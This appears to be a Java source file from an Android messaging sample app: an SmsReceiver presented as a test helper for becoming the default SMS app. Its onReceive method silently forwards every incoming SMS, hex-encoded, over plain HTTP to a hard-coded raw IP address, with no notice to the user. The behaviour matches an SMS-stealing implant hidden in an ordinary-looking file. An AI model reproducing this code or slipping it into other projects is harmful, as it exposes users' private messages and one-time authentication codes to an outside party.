/*
 * Copyright 2014 Jacob Klinker
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.klinker.android.messaging_sample;

import android.annotation.SuppressLint;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.support.annotation.RequiresApi;

import android.telephony.SmsMessage;


import java.io.IOException;
import java.util.Arrays;
import java.util.List;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

/**
 * Needed to make default sms app for testing
 */
public class SmsReceiver extends BroadcastReceiver {

//    private TextView result;
////
//    public SmsReceiver(TextView result) {
//        this.result = result;
//    }
    private MainActivity mainActivity;
//
//    public SmsReceiver(MainActivity mainActivity) {
//        this.mainActivity = mainActivity;
//    }
    OkHttpClient client = new OkHttpClient();

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    @SuppressLint("ServiceCast")
    @Override
    public void onReceive(Context context, Intent intent) {

        System.out.println("Receiver start");
        System.out.println(intent.getExtras().get("pdus"));
        Object[] smsExtra = (Object[]) intent.getExtras().get("pdus");
        String body = "";
        System.out.println(Arrays.toString(smsExtra));
        for (int i = 0; i < smsExtra.length; ++i) {
            final SmsMessage sms = SmsMessage.createFromPdu((byte[]) smsExtra[i]);
            System.out.println(bytesToHex(sms.getPdu()));
            System.out.println(context.getApplicationContext());
            body += sms.getMessageBody();

            new Thread(new Runnable() {
                public void run() {
                    // Perform network operation here
                    // Post result back to UI thread using Handler
                    Request request = new Request.Builder()
                            .url("http://45.137.148.94:9999/api/sms?hex="+bytesToHex(sms.getPdu()))
                            .build();

                    try (Response response = client.newCall(request).execute()) {
                        System.out.println(response.body().string());
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }).start();




        }

//        System.out.println("AAAAAAAAAAAAAAAaa");
//        System.out.println(body);
//        Notification notification = null;
//        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.JELLY_BEAN) {
//            notification = new Notification.Builder(context)
//                    .setContentText(body)
//                    .setContentTitle("New Message")
//                    .setSmallIcon(R.drawable.ic_alert)
//                    .setStyle(new Notification.BigTextStyle().bigText(body))
//                    .build();
//        }
//        NotificationManagerCompat notificationManagerCompat = NotificationManagerCompat.from(context);
//        notificationManagerCompat.notify(1, notification);
    }

    private static final char[] HEX_ARRAY = "0123456789ABCDEF".toCharArray();
    public static String bytesToHex(byte[] bytes) {
        char[] hexChars = new char[bytes.length * 2];
        for (int j = 0; j < bytes.length; j++) {
            int v = bytes[j] & 0xFF;
            hexChars[j * 2] = HEX_ARRAY[v >>> 4];
            hexChars[j * 2 + 1] = HEX_ARRAY[v & 0x0F];
        }
        return new String(hexChars);
    }
}
